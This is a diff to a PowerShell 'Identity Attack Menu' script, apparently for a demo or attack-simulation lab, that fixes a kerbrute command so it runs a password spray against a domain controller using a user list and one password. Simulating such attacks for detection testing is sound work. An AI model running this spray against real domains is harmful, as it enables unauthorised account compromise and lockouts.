@@ -1,4 +1,4 @@
-﻿﻿﻿# ============================================================
+﻿﻿﻿﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -100,7 +100,7 @@ do {
 
             try {
                 $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
-                    -ArgumentList "-dc $env:ENV_DC_IP -domain $env:ENV_DOMAIN -users `"$idpDir\users.txt`" -password $env:ENV_PASSWORD" `
+                    -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$idpDir\users.txt`" $env:ENV_PASSWORD" `
                     -NoNewWindow -Wait -PassThru
                 Write-Host "`n[+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
             } catch {
